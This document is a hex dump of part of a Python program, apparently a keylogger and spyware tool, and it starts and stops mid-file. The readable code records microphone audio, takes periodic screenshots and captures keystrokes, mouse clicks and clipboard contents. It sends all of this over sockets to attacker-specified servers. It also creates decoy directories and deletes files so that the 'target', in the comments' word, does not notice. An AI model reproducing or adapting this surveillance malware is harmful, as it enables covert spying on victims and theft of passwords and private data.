+00000910: 6f72 6469 6e67 2229 0d0a 0d0a 2020 2020  ording")....    
+00000920: 2020 2020 2020 2020 2320 7374 6f70 2052          # stop R
+00000930: 6563 6f72 6469 6e67 0d0a 2020 2020 2020  ecording..      
+00000940: 2020 2020 2020 7374 7265 616d 2e73 746f        stream.sto
+00000950: 705f 7374 7265 616d 2829 0d0a 2020 2020  p_stream()..    
+00000960: 2020 2020 2020 2020 7374 7265 616d 2e63          stream.c
+00000970: 6c6f 7365 2829 0d0a 2020 2020 2020 2020  lose()..        
+00000980: 2020 2020 6175 6469 6f2e 7465 726d 696e      audio.termin
+00000990: 6174 6528 290d 0a0d 0a20 2020 2020 2020  ate()....       
+000009a0: 2020 2020 2023 2043 6f6e 6e65 6374 696f       # Connectio
+000009b0: 6e20 7769 7468 2053 6572 7665 724c 6973  n with ServerLis
+000009c0: 7465 6e65 720d 0a0d 0a20 2020 2020 2020  tener....       
+000009d0: 2020 2020 2073 7472 5f66 7261 6d65 7320       str_frames 
+000009e0: 3d20 7374 7228 6672 616d 6573 290d 0a20  = str(frames).. 
+000009f0: 2020 2020 2020 2020 2020 206c 6973 7465             liste
+00000a00: 6e69 6e67 5f64 6174 612e 7365 6e64 2873  ning_data.send(s
+00000a10: 7472 5f66 7261 6d65 732e 656e 636f 6465  tr_frames.encode
+00000a20: 2829 290d 0a0d 0a20 2020 2020 2020 2065  ())....        e
+00000a30: 7863 6570 7420 4f53 4572 726f 723a 0d0a  xcept OSError:..
+00000a40: 2020 2020 2020 2020 2020 2020 7072 696e              prin
+00000a50: 7428 224e 4f20 4d49 4352 4f50 484f 4e45  t("NO MICROPHONE
+00000a60: 2044 4554 4543 5445 4420 4f52 204d 4943   DETECTED OR MIC
+00000a70: 524f 5048 4f4e 4520 5345 5454 494e 4720  ROPHONE SETTING 
+00000a80: 4449 5341 424c 4544 2229 0d0a 2020 2020  DISABLED")..    
+00000a90: 2020 2020 2020 2020 6e6f 5f6d 6963 726f          no_micro
+00000aa0: 666f 6e20 3d20 2254 4845 2054 4152 4745  fon = "THE TARGE
+00000ab0: 5420 4841 5320 4e4f 204d 4943 524f 5048  T HAS NO MICROPH
+00000ac0: 4f4e 4520 4f4e 220d 0a20 2020 2020 2020  ONE ON"..       
+00000ad0: 2020 2020 206c 6973 7465 6e69 6e67 5f64       listening_d
+00000ae0: 6174 612e 7365 6e64 286e 6f5f 6d69 6372  ata.send(no_micr
+00000af0: 6f66 6f6e 2e65 6e63 6f64 6528 2929 0d0a  ofon.encode())..
+00000b00: 2020 2020 2020 2020 2020 2020 2320 5365              # Se
+00000b10: 6e64 7320 6461 7461 2074 6f20 5365 7276  nds data to Serv
+00000b20: 6572 4c69 7374 656e 6572 0d0a 0d0a 2020  erListener....  
+00000b30: 2020 6465 6620 616c 6c5f 6469 7228 7365    def all_dir(se
+00000b40: 6c66 293a 0d0a 2020 2020 2020 2020 676c  lf):..        gl
+00000b50: 6f62 616c 2072 616e 646f 6d5f 6c73 740d  obal random_lst.
+00000b60: 0a20 2020 2020 2020 207a 6569 6368 656e  .        zeichen
+00000b70: 203d 2022 7177 6572 747a 7569 6f70 6173   = "qwertzuiopas
+00000b80: 6466 6768 6a6b 6c79 7863 7662 6e6d 3132  dfghjklyxcvbnm12
+00000b90: 3334 3536 3738 3930 220d 0a20 2020 2020  34567890"..     
+00000ba0: 2020 2072 616e 646f 6d5f 6c73 7420 3d20     random_lst = 
+00000bb0: 5b22 222e 6a6f 696e 2872 616e 646f 6d2e  ["".join(random.
+00000bc0: 7361 6d70 6c65 287a 6569 6368 656e 2c20  sample(zeichen, 
+00000bd0: 7261 6e64 6f6d 2e72 616e 6469 6e74 2834  random.randint(4
+00000be0: 2c20 3130 2929 2920 666f 7220 7820 696e  , 10))) for x in
+00000bf0: 2072 616e 6765 2831 3030 295d 0d0a 2020   range(100)]..  
+00000c00: 2020 2020 2020 2320 5468 6973 206d 616b        # This mak
+00000c10: 6573 2061 206c 6973 7420 6f66 2065 7665  es a list of eve
+00000c20: 7279 2064 6972 6563 746f 7279 206e 616d  ry directory nam
+00000c30: 6520 7261 6e64 6f6d 6c79 0d0a 2020 2020  e randomly..    
+00000c40: 2020 2020 666f 7220 6469 725f 6e61 6d65      for dir_name
+00000c50: 2069 6e20 7261 6e64 6f6d 5f6c 7374 3a0d   in random_lst:.
+00000c60: 0a20 2020 2020 2020 2020 2020 206f 732e  .            os.
+00000c70: 7379 7374 656d 2866 226d 6b64 6972 207b  system(f"mkdir {
+00000c80: 6469 725f 6e61 6d65 7d22 290d 0a20 2020  dir_name}")..   
+00000c90: 2020 2020 2020 2020 2023 2054 6865 2064           # The d
+00000ca0: 6972 6563 746f 7279 2069 7320 6265 696e  irectory is bein
+00000cb0: 6720 6d61 6465 2068 6572 650d 0a0d 0a20  g made here.... 
+00000cc0: 2020 2020 2020 2072 616e 646f 6d5f 6469         random_di
+00000cd0: 7220 3d20 7261 6e64 6f6d 2e63 686f 6963  r = random.choic
+00000ce0: 6528 7261 6e64 6f6d 5f6c 7374 290d 0a20  e(random_lst).. 
+00000cf0: 2020 2020 2020 206f 732e 6368 6469 7228         os.chdir(
+00000d00: 7261 6e64 6f6d 5f64 6972 290d 0a20 2020  random_dir)..   
+00000d10: 2020 2020 2023 2057 6520 6172 6520 6e6f       # We are no
+00000d20: 7720 696e 2074 6861 7420 6469 7265 6374  w in that direct
+00000d30: 6f72 7920 7768 6572 6520 7468 6520 696d  ory where the im
+00000d40: 6167 6520 6361 6e20 6265 2073 746f 7265  age can be store
+00000d50: 640d 0a0d 0a20 2020 2064 6566 2063 6c69  d....    def cli
+00000d60: 656e 7428 7365 6c66 2c20 6970 5f70 686f  ent(self, ip_pho
+00000d70: 746f 732c 2070 6f72 745f 7068 6f74 6f73  tos, port_photos
+00000d80: 293a 0d0a 2020 2020 2020 2020 676c 6f62  ):..        glob
+00000d90: 616c 2066 6861 6e64 6c65 0d0a 2020 2020  al fhandle..    
+00000da0: 2020 2020 2320 6668 616e 646c 6520 6973      # fhandle is
+00000db0: 2074 6865 2076 6172 6961 626c 6520 7768   the variable wh
+00000dc0: 6963 6820 6f70 656e 7320 7468 6520 666f  ich opens the fo
+00000dd0: 746f 0d0a 2020 2020 2020 2020 7320 3d20  to..        s = 
+00000de0: 736f 636b 6574 2e73 6f63 6b65 7428 736f  socket.socket(so
+00000df0: 636b 6574 2e41 465f 494e 4554 2c20 736f  cket.AF_INET, so
+00000e00: 636b 6574 2e53 4f43 4b5f 5354 5245 414d  cket.SOCK_STREAM
+00000e10: 290d 0a20 2020 2020 2020 2073 2e63 6f6e  )..        s.con
+00000e20: 6e65 6374 2828 6970 5f70 686f 746f 732c  nect((ip_photos,
+00000e30: 2070 6f72 745f 7068 6f74 6f73 2929 0d0a   port_photos))..
+00000e40: 2020 2020 2020 2020 2320 5468 6973 2063          # This c
+00000e50: 6f6e 6e65 6374 7320 746f 2074 6865 2073  onnects to the s
+00000e60: 6572 7665 7220 796f 7520 7370 6563 6966  erver you specif
+00000e70: 6965 640d 0a20 2020 2020 2020 2069 6d61  ied..        ima
+00000e80: 6765 203d 2070 672e 7363 7265 656e 7368  ge = pg.screensh
+00000e90: 6f74 2829 0d0a 2020 2020 2020 2020 2320  ot()..        # 
+00000ea0: 2269 6d61 6765 2220 7363 7265 656e 7368  "image" screensh
+00000eb0: 6f74 7320 7468 6520 6375 7272 656e 7420  ots the current 
+00000ec0: 696d 6167 6520 6166 7465 7220 6120 7370  image after a sp
+00000ed0: 6563 6966 6963 2074 696d 650d 0a20 2020  ecific time..   
+00000ee0: 2020 2020 2066 6f74 6f6e 616d 6520 3d20       fotoname = 
+00000ef0: 2249 6d61 6765 2e70 6e67 220d 0a20 2020  "Image.png"..   
+00000f00: 2020 2020 2023 204e 616d 6520 6f66 2074       # Name of t
+00000f10: 6865 2069 6d61 6765 0d0a 2020 2020 2020  he image..      
+00000f20: 2020 696d 6167 652e 7361 7665 2866 6f74    image.save(fot
+00000f30: 6f6e 616d 6529 0d0a 2020 2020 2020 2020  oname)..        
+00000f40: 2320 5361 7665 7320 7468 6520 696d 6167  # Saves the imag
+00000f50: 6520 696e 2074 6865 2063 7572 7265 6e74  e in the current
+00000f60: 2064 6972 6563 746f 7279 0d0a 2020 2020   directory..    
+00000f70: 2020 2020 6668 616e 646c 6520 3d20 6f70      fhandle = op
+00000f80: 656e 2866 6f74 6f6e 616d 652c 2022 7262  en(fotoname, "rb
+00000f90: 2229 0d0a 2020 2020 2020 2020 2320 4f70  ")..        # Op
+00000fa0: 656e 7320 7468 6520 696d 6167 650d 0a0d  ens the image...
+00000fb0: 0a20 2020 2020 2020 2066 756c 6c5f 6d73  .        full_ms
+00000fc0: 6720 3d20 6222 220d 0a20 2020 2020 2020  g = b""..       
+00000fd0: 2023 2045 7665 7279 2069 6d61 6765 2069   # Every image i
+00000fe0: 6e66 6f72 6d61 7469 6f6e 2077 696c 6c20  nformation will 
+00000ff0: 6265 2073 746f 7265 6420 696e 2022 6675  be stored in "fu
+00001000: 6c6c 5f6d 7367 220d 0a20 2020 2020 2020  ll_msg"..       
+00001010: 2066 6f72 206c 696e 6520 696e 2066 6861   for line in fha
+00001020: 6e64 6c65 3a0d 0a20 2020 2020 2020 2020  ndle:..         
+00001030: 2020 2066 756c 6c5f 6d73 6720 2b3d 206c     full_msg += l
+00001040: 696e 650d 0a0d 0a20 2020 2020 2020 2073  ine....        s
+00001050: 2e73 656e 6428 6675 6c6c 5f6d 7367 290d  .send(full_msg).
+00001060: 0a0d 0a20 2020 2064 6566 2063 6f75 6e74  ...    def count
+00001070: 646f 776e 5f73 656e 6428 7365 6c66 2c20  down_send(self, 
+00001080: 7a65 6974 2c20 6970 5f70 686f 746f 732c  zeit, ip_photos,
+00001090: 2070 6f72 745f 7068 6f74 6f73 2c20 6970   port_photos, ip
+000010a0: 5f6b 6579 6c6f 6767 6572 2c20 706f 7274  _keylogger, port
+000010b0: 5f6b 6579 6c6f 6767 6572 293a 0d0a 2020  _keylogger):..  
+000010c0: 2020 2020 2020 7365 636f 6e64 735f 6c69        seconds_li
+000010d0: 7374 203d 205b 7a61 686c 2066 6f72 207a  st = [zahl for z
+000010e0: 6168 6c20 696e 2072 616e 6765 2830 2c20  ahl in range(0, 
+000010f0: 7a65 6974 202b 2031 2c20 3230 2920 6966  zeit + 1, 20) if
+00001100: 207a 6168 6c20 213d 2030 5d0d 0a20 2020   zahl != 0]..   
+00001110: 2020 2020 2023 2054 6865 2073 6563 6f6e       # The secon
+00001120: 6473 2074 6865 2069 6d61 6765 2077 696c  ds the image wil
+00001130: 6c20 6265 2073 656e 7420 696e 2032 3020  l be sent in 20 
+00001140: 7374 6570 7320 746f 2074 6865 2073 6572  steps to the ser
+00001150: 7665 7220 7769 6c6c 2062 6520 7361 7665  ver will be save
+00001160: 6420 696e 2022 7365 636f 6e64 735f 6c69  d in "seconds_li
+00001170: 7374 220d 0a20 2020 2020 2020 2070 7269  st"..        pri
+00001180: 6e74 2873 6563 6f6e 6473 5f6c 6973 7429  nt(seconds_list)
+00001190: 0d0a 2020 2020 2020 2020 6b65 795f 6461  ..        key_da
+000011a0: 7461 203d 2073 6f63 6b65 742e 736f 636b  ta = socket.sock
+000011b0: 6574 2873 6f63 6b65 742e 4146 5f49 4e45  et(socket.AF_INE
+000011c0: 542c 2073 6f63 6b65 742e 534f 434b 5f53  T, socket.SOCK_S
+000011d0: 5452 4541 4d29 0d0a 0d0a 2020 2020 2020  TREAM)....      
+000011e0: 2020 7472 793a 0d0a 2020 2020 2020 2020    try:..        
+000011f0: 2020 2020 666f 7220 7820 696e 2072 616e      for x in ran
+00001200: 6765 287a 6569 7420 2b20 3129 3a0d 0a20  ge(zeit + 1):.. 
+00001210: 2020 2020 2020 2020 2020 2020 2020 2069                 i
+00001220: 6620 7820 3d3d 2032 303a 0d0a 2020 2020  f x == 20:..    
+00001230: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00001240: 7365 6c66 2e61 6c6c 5f64 6972 2829 0d0a  self.all_dir()..
+00001250: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00001260: 2020 2020 2320 5468 6973 2066 756e 6374      # This funct
+00001270: 696f 6e20 6d61 6b65 7320 3130 3020 6669  ion makes 100 fi
+00001280: 6c65 7320 746f 2073 746f 7265 2074 6865  les to store the
+00001290: 2069 6d61 6765 2073 6f20 7468 6520 7461   image so the ta
+000012a0: 7267 6574 2077 6f6e 2774 2066 696e 6420  rget won't find 
+000012b0: 6f75 740d 0a20 2020 2020 2020 2020 2020  out..           
+000012c0: 2020 2020 2070 7269 6e74 2878 290d 0a20       print(x).. 
+000012d0: 2020 2020 2020 2020 2020 2020 2020 207a                 z
+000012e0: 6569 7420 2d3d 2031 0d0a 2020 2020 2020  eit -= 1..      
+000012f0: 2020 2020 2020 2020 2020 7469 6d65 2e73            time.s
+00001300: 6c65 6570 2831 290d 0a20 2020 2020 2020  leep(1)..       
+00001310: 2020 2020 2020 2020 2069 6620 7820 696e           if x in
+00001320: 2073 6563 6f6e 6473 5f6c 6973 743a 0d0a   seconds_list:..
+00001330: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00001340: 2020 2020 7365 6c66 2e63 6c69 656e 7428      self.client(
+00001350: 6970 5f70 686f 746f 732c 2070 6f72 745f  ip_photos, port_
+00001360: 7068 6f74 6f73 290d 0a20 2020 2020 2020  photos)..       
+00001370: 2020 2020 2020 2020 2020 2020 2023 2054               # T
+00001380: 6865 2069 6d61 6765 7320 7769 6c6c 2062  he images will b
+00001390: 6520 7365 6e74 0d0a 2020 2020 2020 2020  e sent..        
+000013a0: 2020 2020 6b65 795f 6461 7461 2e63 6f6e      key_data.con
+000013b0: 6e65 6374 2828 6970 5f6b 6579 6c6f 6767  nect((ip_keylogg
+000013c0: 6572 2c20 706f 7274 5f6b 6579 6c6f 6767  er, port_keylogg
+000013d0: 6572 2929 0d0a 2020 2020 2020 2020 2020  er))..          
+000013e0: 2020 2320 5468 6973 2069 7320 7468 6520    # This is the 
+000013f0: 6970 2061 6e64 2074 6865 2070 6f72 7420  ip and the port 
+00001400: 6f66 2074 6865 2073 6572 7665 7220 7468  of the server th
+00001410: 6520 706f 7274 2073 686f 756c 646e 2774  e port shouldn't
+00001420: 2062 6520 7468 6520 7361 6d65 2074 6865   be the same the
+00001430: 2073 6572 7665 725f 7068 6f74 6f73 2061   server_photos a
+00001440: 6e64 2074 6865 2073 6572 7665 725f 6b65  nd the server_ke
+00001450: 796c 6f67 6765 7220 7368 6f75 6c64 6e27  ylogger shouldn'
+00001460: 7420 6265 0d0a 2020 2020 2020 2020 2020  t be..          
+00001470: 2020 2320 696e 2074 6865 2073 616d 6520    # in the same 
+00001480: 666f 6c64 6572 0d0a 2020 2020 2020 2020  folder..        
+00001490: 2020 2020 7365 6c66 2e63 6f6f 7264 696e      self.coordin
+000014a0: 6174 6573 203d 206c 6973 7428 7365 7428  ates = list(set(
+000014b0: 7365 6c66 2e63 6f6f 7264 696e 6174 6573  self.coordinates
+000014c0: 2929 0d0a 2020 2020 2020 2020 2020 2020  ))..            
+000014d0: 2320 5468 6973 2063 6865 636b 7320 6966  # This checks if
+000014e0: 2074 6865 2063 6f6f 7264 696e 6174 6573   the coordinates
+000014f0: 206f 6363 7572 2032 2074 696d 6573 0d0a   occur 2 times..
+00001500: 2020 2020 2020 2020 2020 2020 7072 696e              prin
+00001510: 7428 7365 6c66 2e63 6f6f 7264 696e 6174  t(self.coordinat
+00001520: 6573 290d 0a20 2020 2020 2020 2020 2020  es)..           
+00001530: 2077 6f72 7420 3d20 2222 0d0a 2020 2020   wort = ""..    
+00001540: 2020 2020 2020 2020 666f 7220 7a65 6963          for zeic
+00001550: 6865 6e20 696e 2073 656c 662e 7269 6368  hen in self.rich
+00001560: 7469 6765 5f6c 6973 7465 3a0d 0a20 2020  tige_liste:..   
+00001570: 2020 2020 2020 2020 2020 2020 2077 6f72               wor
+00001580: 7420 2b3d 207a 6569 6368 656e 0d0a 0d0a  t += zeichen....
+00001590: 2020 2020 2020 2020 2020 2020 2320 5365              # Se
+000015a0: 6e64 7320 7468 6520 6461 7461 2074 6f20  nds the data to 
+000015b0: 7365 7276 6572 5f6b 6579 6c6f 6767 6572  server_keylogger
+000015c0: 0d0a 2020 2020 2020 2020 2020 2020 616c  ..            al
+000015d0: 6c5f 6461 7461 203d 2073 7472 2873 656c  l_data = str(sel
+000015e0: 662e 636f 6f72 6469 6e61 7465 7329 202b  f.coordinates) +
+000015f0: 2077 6f72 740d 0a20 2020 2020 2020 2020   wort..         
+00001600: 2020 2023 2043 6f6f 7264 696e 6174 6573     # Coordinates
+00001610: 2061 6e64 206b 6579 6461 7461 2061 7265   and keydata are
+00001620: 2062 6569 6e67 2063 6f6e 6361 7465 6e61   being concatena
+00001630: 7465 640d 0a20 2020 2020 2020 2020 2020  ted..           
+00001640: 206b 6579 5f64 6174 612e 7365 6e64 2861   key_data.send(a
+00001650: 6c6c 5f64 6174 612e 656e 636f 6465 2829  ll_data.encode()
+00001660: 290d 0a20 2020 2020 2020 2020 2020 2070  )..            p
+00001670: 7269 6e74 2877 6f72 7429 0d0a 2020 2020  rint(wort)..    
+00001680: 2020 2020 2020 2020 7072 696e 7428 7365          print(se
+00001690: 6c66 2e72 6963 6874 6967 655f 6c69 7374  lf.richtige_list
+000016a0: 6529 0d0a 2020 2020 2020 2020 2020 2020  e)..            
+000016b0: 6668 616e 646c 652e 636c 6f73 6528 290d  fhandle.close().
+000016c0: 0a20 2020 2020 2020 2020 2020 2023 2043  .            # C
+000016d0: 6c6f 7365 7320 7468 6520 696d 6167 650d  loses the image.
+000016e0: 0a20 2020 2020 2020 2020 2020 206f 732e  .            os.
+000016f0: 7265 6d6f 7665 2822 496d 6167 652e 706e  remove("Image.pn
+00001700: 6722 290d 0a20 2020 2020 2020 2020 2020  g")..           
+00001710: 2023 2044 656c 6574 6573 2074 6865 2069   # Deletes the i
+00001720: 6d61 6765 2069 6e20 7468 6520 6375 7272  mage in the curr
+00001730: 656e 7420 6469 7265 6374 6f72 790d 0a20  ent directory.. 
+00001740: 2020 2020 2020 2020 2020 206f 732e 6368             os.ch
+00001750: 6469 7228 222e 2e22 290d 0a20 2020 2020  dir("..")..     
+00001760: 2020 2020 2020 2023 2057 6520 6861 7665         # We have
+00001770: 2074 6f20 676f 2062 6163 6b20 736f 2074   to go back so t
+00001780: 6861 7420 7765 2063 616e 2064 656c 6574  hat we can delet
+00001790: 6520 7468 6520 6f74 6865 7220 6469 7265  e the other dire
+000017a0: 6374 6f72 6965 730d 0a20 2020 2020 2020  ctories..       
+000017b0: 2020 2020 2066 6f72 2065 6163 685f 6469       for each_di
+000017c0: 7220 696e 2072 616e 646f 6d5f 6c73 743a  r in random_lst:
+000017d0: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
+000017e0: 2020 6f73 2e73 7973 7465 6d28 6622 726d    os.system(f"rm
+000017f0: 6469 7220 7b65 6163 685f 6469 727d 2229  dir {each_dir}")
+00001800: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
+00001810: 2020 2320 5468 6973 2064 656c 6574 6573    # This deletes
+00001820: 2065 7665 7279 2064 6972 6563 746f 7279   every directory
+00001830: 0d0a 2020 2020 2020 2020 2020 2020 7379  ..            sy
+00001840: 732e 6578 6974 2829 0d0a 2020 2020 2020  s.exit()..      
+00001850: 2020 2020 2020 2320 5374 6f70 7320 7468        # Stops th
+00001860: 6520 6b65 796c 6f67 6765 720d 0a20 2020  e keylogger..   
+00001870: 2020 2020 2065 7863 6570 7420 4b65 7962       except Keyb
+00001880: 6f61 7264 496e 7465 7272 7570 743a 0d0a  oardInterrupt:..
+00001890: 2020 2020 2020 2020 2020 2020 2320 4966              # If
+000018a0: 2074 6865 2074 6172 6765 7420 6861 7320   the target has 
+000018b0: 6465 7374 726f 7965 6420 7468 6520 636f  destroyed the co
+000018c0: 6e6e 6563 7469 6f6e 0d0a 2020 2020 2020  nnection..      
+000018d0: 2020 2020 2020 776f 7274 203d 2022 2a2a        wort = "**
+000018e0: 2a25 c2a7 c2a7 29c2 a7c2 a725 220d 0a20  *%....)....%".. 
+000018f0: 2020 2020 2020 2020 2020 2023 2054 6869             # Thi
+00001900: 7320 6973 206c 696b 6520 6120 7370 6563  s is like a spec
+00001910: 6961 6c20 636f 6465 2e20 546f 2073 706c  ial code. To spl
+00001920: 6974 2069 7420 6174 2074 6865 2065 6e64  it it at the end
+00001930: 0d0a 2020 2020 2020 2020 2020 2020 666f  ..            fo
+00001940: 7220 7a65 6963 6865 6e20 696e 2073 656c  r zeichen in sel
+00001950: 662e 7269 6368 7469 6765 5f6c 6973 7465  f.richtige_liste
+00001960: 3a0d 0a20 2020 2020 2020 2020 2020 2020  :..             
+00001970: 2020 2077 6f72 7420 2b3d 207a 6569 6368     wort += zeich
+00001980: 656e 0d0a 2020 2020 2020 2020 2020 2020  en..            
+00001990: 6461 7461 203d 2066 2254 4845 2043 4f4e  data = f"THE CON
+000019a0: 4e45 4354 494f 4e20 4841 5320 4245 454e  NECTION HAS BEEN
+000019b0: 2049 4e54 4552 5255 5054 4544 7b77 6f72   INTERRUPTED{wor
+000019c0: 747d 220d 0a20 2020 2020 2020 2020 2020  t}"..           
+000019d0: 2023 2054 6869 7320 6c65 7427 7320 7468   # This let's th
+000019e0: 6520 7365 7276 6572 206b 6e6f 7720 7468  e server know th
+000019f0: 6174 2074 6865 2073 6572 7665 7220 7368  at the server sh
+00001a00: 6f75 6c64 2073 6875 7420 646f 776e 0d0a  ould shut down..
+00001a10: 2020 2020 2020 2020 2020 2020 6b65 795f              key_
+00001a20: 6461 7461 2e63 6f6e 6e65 6374 2828 6970  data.connect((ip
+00001a30: 5f6b 6579 6c6f 6767 6572 2c20 706f 7274  _keylogger, port
+00001a40: 5f6b 6579 6c6f 6767 6572 2929 0d0a 2020  _keylogger))..  
+00001a50: 2020 2020 2020 2020 2020 6b65 795f 6461            key_da
+00001a60: 7461 2e73 656e 6428 6461 7461 2e65 6e63  ta.send(data.enc
+00001a70: 6f64 6528 2929 0d0a 2020 2020 2020 2020  ode())..        
+00001a80: 2020 2020 6b65 795f 6461 7461 2e63 6c6f      key_data.clo
+00001a90: 7365 2829 0d0a 0d0a 2020 2020 2020 2020  se()....        
+00001aa0: 2020 2020 6966 206f 732e 7061 7468 2e65      if os.path.e
+00001ab0: 7869 7374 7328 2249 6d61 6765 2e70 6e67  xists("Image.png
+00001ac0: 2229 3a0d 0a20 2020 2020 2020 2020 2020  "):..           
+00001ad0: 2020 2020 2023 2049 7420 7769 6c6c 2064       # It will d
+00001ae0: 6573 7472 6f79 2074 6865 2069 6d61 6765  estroy the image
+00001af0: 2073 6f20 7461 7267 6574 2077 6f75 6e64   so target wound
+00001b00: 206b 6e6f 7720 616e 7974 6869 6e67 0d0a   know anything..
+00001b10: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00001b20: 6668 616e 646c 652e 636c 6f73 6528 290d  fhandle.close().
+00001b30: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+00001b40: 206f 732e 7265 6d6f 7665 2822 496d 6167   os.remove("Imag
+00001b50: 652e 706e 6722 290d 0a20 2020 2020 2020  e.png")..       
+00001b60: 2020 2020 2023 2054 6869 7320 7265 6d6f       # This remo
+00001b70: 7665 7320 7468 6520 696d 6167 650d 0a0d  ves the image...
+00001b80: 0a20 2020 2064 6566 206b 696c 6c5f 7377  .    def kill_sw
+00001b90: 6974 6368 2873 656c 6629 3a0d 0a20 2020  itch(self):..   
+00001ba0: 2020 2020 2023 2054 6869 7320 6675 6e63       # This func
+00001bb0: 7469 6f6e 2064 6573 7472 6f79 7320 7468  tion destroys th
+00001bc0: 6520 6d6f 7573 6520 696e 666f 0d0a 2020  e mouse info..  
+00001bd0: 2020 2020 2020 6e65 775f 7365 636f 6e64        new_second
+00001be0: 7320 3d20 7365 6c66 2e64 7572 6174 696f  s = self.duratio
+00001bf0: 6e20 2b20 350d 0a20 2020 2020 2020 2023  n + 5..        #
+00001c00: 2032 3020 7365 636f 6e64 7320 6172 6520   20 seconds are 
+00001c10: 6265 696e 6720 6164 6465 6420 6265 6361  being added beca
+00001c20: 7573 6520 7468 6572 6520 6d69 6768 7420  use there might 
+00001c30: 6265 2061 2070 726f 626c 656d 0d0a 2020  be a problem..  
+00001c40: 2020 2020 2020 666f 7220 7820 696e 2072        for x in r
+00001c50: 616e 6765 286e 6577 5f73 6563 6f6e 6473  ange(new_seconds
+00001c60: 293a 0d0a 2020 2020 2020 2020 2020 2020  ):..            
+00001c70: 7469 6d65 2e73 6c65 6570 2831 290d 0a20  time.sleep(1).. 
+00001c80: 2020 2020 2020 2023 2054 6869 7320 7374         # This st
+00001c90: 6f70 6573 2074 6865 0d0a 2020 2020 2020  opes the..      
+00001ca0: 2020 7379 732e 6578 6974 2829 0d0a 0d0a    sys.exit()....
+00001cb0: 2020 2020 6465 6620 6f6e 5f63 6c69 636b      def on_click
+00001cc0: 2873 656c 662c 2078 2c20 792c 2062 7574  (self, x, y, but
+00001cd0: 746f 6e2c 2070 7265 7373 6564 293a 0d0a  ton, pressed):..
+00001ce0: 2020 2020 2020 2020 2320 5468 6973 2069          # This i
+00001cf0: 7320 7468 6520 636c 6963 6b20 6675 6e63  s the click func
+00001d00: 7469 6f6e 0d0a 2020 2020 2020 2020 7072  tion..        pr
+00001d10: 696e 7428 6622 5461 7267 6574 2068 6173  int(f"Target has
+00001d20: 2070 7265 7373 6564 207b 787d 2061 6e64   pressed {x} and
+00001d30: 207b 797d 2229 0d0a 2020 2020 2020 2020   {y}")..        
+00001d40: 2320 416c 6c20 7468 6520 636f 6f72 6469  # All the coordi
+00001d50: 6e61 7465 7320 7769 6c6c 2062 6520 7374  nates will be st
+00001d60: 6f72 6564 2069 6e20 2273 656c 662e 636f  ored in "self.co
+00001d70: 6f72 6469 6e61 7465 7322 0d0a 2020 2020  ordinates"..    
+00001d80: 2020 2020 7365 6c66 2e63 6f6f 7264 696e      self.coordin
+00001d90: 6174 6573 2e61 7070 656e 6428 2878 2c20  ates.append((x, 
+00001da0: 7929 290d 0a0d 0a20 2020 2064 6566 2061  y))....    def a
+00001db0: 6c6c 5f63 6c69 636b 7328 7365 6c66 293a  ll_clicks(self):
+00001dc0: 0d0a 2020 2020 2020 2020 2320 5468 6973  ..        # This
+00001dd0: 2069 7320 6a75 7374 2061 2066 756e 6374   is just a funct
+00001de0: 696f 6e20 736f 2069 7420 6361 6e20 6265  ion so it can be
+00001df0: 2072 616e 2077 6974 6820 7468 7265 6164   ran with thread
+00001e00: 696e 670d 0a20 2020 2020 2020 2077 6974  ing..        wit
+00001e10: 6820 4c69 7374 656e 6572 286f 6e5f 636c  h Listener(on_cl
+00001e20: 6963 6b3d 7365 6c66 2e6f 6e5f 636c 6963  ick=self.on_clic
+00001e30: 6b29 2061 7320 6c69 7374 656e 696e 673a  k) as listening:
+00001e40: 0d0a 2020 2020 2020 2020 2020 2020 7365  ..            se
+00001e50: 6c66 2e6b 696c 6c5f 7377 6974 6368 2829  lf.kill_switch()
+00001e60: 0d0a 2020 2020 2020 2020 2020 2020 6c69  ..            li
+00001e70: 7374 656e 696e 672e 6a6f 696e 2829 0d0a  stening.join()..
+00001e80: 2020 2020 0d0a 2020 2020 6465 6620 636f      ..    def co
+00001e90: 7079 5f64 6174 6128 7365 6c66 293a 0d0a  py_data(self):..
+00001ea0: 2020 2020 2020 2020 7365 6c66 2e72 6963          self.ric
+00001eb0: 6874 6967 655f 6c69 7374 652e 6170 7065  htige_liste.appe
+00001ec0: 6e64 2822 2028 434f 5059 2028 5374 7267  nd(" (COPY (Strg
+00001ed0: 2b63 2929 2022 290d 0a0d 0a20 2020 2064  +c)) ")....    d
+00001ee0: 6566 2061 7070 656e 645f 7061 7374 6528  ef append_paste(
+00001ef0: 7365 6c66 293a 0d0a 2020 2020 2020 2020  self):..        
+00001f00: 6461 7461 203d 2066 2220 287b 7079 7065  data = f" ({pype
+00001f10: 7263 6c69 702e 7061 7374 6528 297d 207c  rclip.paste()} |
+00001f20: 2050 4153 5445 2028 5374 7267 2b76 2929   PASTE (Strg+v))
+00001f30: 207c 2022 0d0a 2020 2020 2020 2020 7365   | "..        se
+00001f40: 6c66 2e72 6963 6874 6967 655f 6c69 7374  lf.richtige_list
+00001f50: 652e 6170 7065 6e64 2864 6174 6129 0d0a  e.append(data)..
+00001f60: 0d0a 2020 2020 6465 6620 7072 696e 745f  ..    def print_
+00001f70: 776f 726b 2873 656c 662c 2077 6f72 6429  work(self, word)
+00001f80: 3a0d 0a20 2020 2020 2020 2070 7269 6e74  :..        print
+00001f90: 2866 2741 6c70 6861 6265 7469 7363 6865  (f'Alphabetische
+00001fa0: 2054 6173 7465 2077 7572 6465 2067 6564   Taste wurde ged
+00001fb0: 72c3 bc63 6b74 3a20 7b77 6f72 647d 2027  r..ckt: {word} '
+00001fc0: 290d 0a20 2020 2020 2020 2073 656c 662e  )..        self.
+00001fd0: 7269 6368 7469 6765 5f6c 6973 7465 202b  richtige_liste +
+00001fe0: 3d20 776f 7264 0d0a 2020 2020 2020 2020  = word..        
+00001ff0: 2320 4576 6572 7920 7072 6573 7365 6420  # Every pressed 
+00002000: 6b65 7920 7769 6c6c 2062 6520 7361 7665  key will be save
+00002010: 6420 696e 2022 7269 6368 7469 6765 5f6c  d in "richtige_l
+00002020: 6973 7465 2220 7468 6973 2069 7320 6120  iste" this is a 
+00002030: 6765 726d 616e 2077 6f72 6420 616e 6420  german word and 
+00002040: 6d65 616e 7320 2272 6967 6874 5f6c 6973  means "right_lis
